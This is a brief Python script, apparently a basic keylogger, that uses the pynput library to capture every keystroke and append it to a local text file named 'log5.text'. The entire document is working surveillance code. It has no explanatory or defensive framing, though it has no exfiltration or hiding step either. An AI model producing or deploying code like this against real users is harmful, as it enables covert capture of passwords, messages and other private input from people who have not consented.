from pynput.keyboard import Listener

def write_file(key):
    keydata = str(key)
    keydata = keydata.replace("'"," ")
    with open("log5.text","a") as f:
        f.write(keydata)

with Listener(on_press=write_file)as l:

    l.join()

